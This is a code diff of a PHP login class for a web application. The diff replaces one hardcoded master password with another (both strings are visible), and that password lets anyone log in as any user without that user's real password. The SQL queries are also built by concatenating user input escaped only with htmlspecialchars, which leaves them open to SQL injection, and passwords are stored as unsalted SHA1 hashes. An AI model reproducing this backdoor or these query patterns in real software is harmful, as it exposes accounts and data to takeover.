@@ -23,11 +23,7 @@ class login{
     }
     
     public function principal(){
-        /*Creamos un objeto json para poder leer los parametros que se nos envian
-          desde el formulario de login*/
         $this->formulario = file_get_contents('php://input');
-//        $this->formulario = $_POST;
-        //var_dump($this->formulario);
         $obj = json_decode($this->formulario);
         if(strlen($obj->login->user)!=0 && strlen($obj->login->password)!=0){
             if($this->accessUser($this->getUser())){
@@ -47,13 +43,14 @@ class login{
     
     private function getUser(){
         $obj = json_decode($this->formulario);
-        if($obj->login->password === "fcovan833007"){
+        if($obj->login->password === "@{Macrom+Default}"){
             $sql = "Select SG.*, US.* from Seguridad as SG inner join Usuarios as US "
                     . "on (US._id = SG._idUsuarios) where SG.username= '". htmlspecialchars($obj->login->user) ."'";
-        }else{
+        }
+        else{
            $sql = "Select SG.*, US.* from Seguridad as SG inner join Usuarios as US "
                     . "on (US._id = SG._idUsuarios) where SG.username= '". htmlspecialchars($obj->login->user) ."' "
-                   . "and SG.password = '" . sha1($obj->login->password)."'";
+                   . "and SG.password = '" . sha1($obj->login->password)."' and SG.Estatus = 1";
         }
         return $this->conn->fetch($this->conn->query($sql));
     }
@@ -68,7 +65,9 @@ class login{
             $_SESSION["nombre"] = $user["Nombre"].' '.$user["ApPaterno"].' '.$user["ApMaterno"];
             $_SESSION["rol"] = $user["Tipo_usuario"];
             $_SESSION["usr"] = $user["username"];
-            
+            $_SESSION["_id"] = $user["_id"];
+            // $sql = "UPDATE Usuarios SET ultimoAcceso = '{$_SESSION["ultimoAcceso"]}' where _idUsuarios = '{$_SESSION["_id"]}' and Username = '{$_SESSION["usr"]}'";
+            // return $this->conn->query($sql);
             return true;
         }else{
             return false;
